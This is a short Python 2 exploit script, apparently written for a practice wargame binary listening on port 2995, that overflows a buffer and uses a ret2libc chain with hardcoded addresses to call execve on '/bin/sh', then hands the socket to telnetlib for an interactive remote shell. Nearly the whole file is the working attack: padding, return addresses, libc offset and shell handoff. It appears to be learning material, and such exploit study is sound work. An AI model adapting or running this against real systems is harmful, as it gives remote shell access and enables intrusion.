#!/usr/bin/python

'''
Attempt 1: Uses the LiveOverflow style of exploit (ret2libc + telnetlib to get interactive shell on remote)
'''


import struct
import argparse
import sys
import os
import socket
import telnetlib
socketObject = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2995))
print("Connected")
#resp=socketObject.recv(4)
#resp=""
#print "CLIENT: >",resp

buf=""
buf+="A"*510 # the original buffer size
buf+="\x00" #(Note that offset at 510+1+21=532 bytes)
#bin/sh encoded and reversed
#pattern string for overflow calculation, found to be 21
#buf+="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
#We are going to use the ret2libC technique here which has several benefits over vanilla exploit
buf+="A"*21 #padding
#Address to execve
buf+="\x0c\x8c\x04\x08"
#buf+=struct.pack("I",0x08048c0c)
#buf+="D"*4 #replace this with first instruction of execve
buf+="EEEE"# RET after execve , can be junk
buf+=struct.pack("I",1176511+0xb7e97000) #needs to be the address of /bin/sh string (b7e97000+offset=b7fb63bf)
#\x2f\x62\x69\x6e\x2f\x73\x68
buf+="\x00"*8
buf+="\n"
print socketObject.recv(1024)

t=telnetlib.Telnet()
t.sock=socketObject
t.interact()
